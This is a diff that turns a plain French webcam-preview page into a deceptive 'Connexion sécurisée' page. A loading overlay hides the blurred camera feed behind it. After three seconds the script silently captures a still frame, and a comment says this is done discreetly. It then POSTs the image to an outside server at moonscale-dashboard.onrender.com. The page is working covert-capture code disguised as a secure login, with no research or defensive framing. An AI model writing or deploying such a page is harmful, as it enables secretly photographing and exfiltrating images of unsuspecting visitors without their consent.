@@ -1,20 +1,86 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h2>Accès sécurisé requis</h2>
-    <video id="video" autoplay></video>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion sécurisée</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      overflow: hidden;
+    }
 
-    <script>
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          document.getElementById('video').srcObject = stream;
+    video#video {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      filter: blur(12px) brightness(0.6);
+      z-index: -1;
+    }
 
-          // (optionnel) envoyer le flux quelque part :
-          // envoyerStream(stream);
-        })
-        .catch(error => {
-          console.error("Erreur d'accès à la caméra :", error);
-        });
-    </script>
-  </body>
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-family: sans-serif;
+      font-size: 24px;
+      background: rgba(0, 0, 0, 0.6);
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <div class="overlay">
+    Chargement sécurisé... Veuillez patienter...
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Attendre quelques secondes, puis capturer discrètement
+        setTimeout(() => {
+          captureAndSend();
+        }, 3000);
+      })
+      .catch(err => {
+        console.error("Webcam refusée", err);
+        document.querySelector('.overlay').textContent = "Erreur : webcam refusée";
+      });
+
+    function captureAndSend() {
+      const width = video.videoWidth;
+      const height = video.videoHeight;
+      if (!width || !height) return;
+
+      canvas.width = width;
+      canvas.height = height;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, width, height);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      // 📤 Envoi au serveur
+      fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
+        method: 'POST',
+        body: JSON.stringify({ image: imageData }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+
+      // Optionnel : masquer l’overlay ou rediriger
+      document.querySelector('.overlay').textContent = "Chargement terminé";
+    }
+  </script>
+</body>
 </html>
